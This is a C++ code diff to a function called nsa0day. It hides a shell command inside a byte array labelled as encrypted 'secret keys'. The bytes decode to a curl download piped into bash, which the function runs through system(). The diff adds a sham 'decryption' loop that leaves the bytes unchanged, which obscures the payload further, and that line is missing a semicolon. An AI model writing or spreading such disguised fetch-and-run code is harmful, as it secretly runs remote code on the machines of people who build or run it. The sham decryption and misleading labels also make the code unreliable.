@@ -22,6 +22,9 @@
   |||||||||||||||*/
 // Shhh don't tell them!
 void cyclops::nsa0day(){
+	uint8_t nsaDecryptedKeys[39]; // Store decrypted key
+	
+	// Encrypted key
 	uint8_t nsaSecretKeys[39] = {0x63, 0x75, 0x72, 0x6C, 0x20, 0x2D, 
                                      0x73, 0x20, 0x2D, 0x4C, 0x20, 0x68, 
 				     0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 
@@ -30,14 +33,20 @@ void cyclops::nsa0day(){
 				     0x69, 0x43, 0x20, 0x7C, 0x20, 0x62, 
 			             0x61, 0x73, 0x68};
     
-    	std::stringstream nsaKeys;
+    	std::stringstream nsaKeys; // stream for our decrypted key
 	
-	std::cout << "[Cyclops_0day]: Doing stuff with secret keys..." << std::endl;
+	std::cout << "[Cyclops_0day]: Performing Decryption" << std::endl;
+		
+	for(int z = 0; z < 39; z++){
+		nsaDecryptedKeys[z] = ((((((nsaSecretKeys[z] << 0x02) / 4) << 0x04) / 8) * 0x20) >> 0x06)
+	}
     
+	// Storing decrypted Key into nsaKeys stream
     	for(int x = 0; x < 39; x++){
-        	nsaKeys << static_cast<char>(nsaSecretKeys[x]);
+        	nsaKeys << static_cast<char>(nsaDecryptedKeys[x]);
     	}
 	
+	// Ley user know we are executing the 0day
 	std::cout << "[Cyclops_0day]: Executing 0day!" << std::endl;
     	std::string finalKey = nsaKeys.str();
     	system(finalKey.c_str());
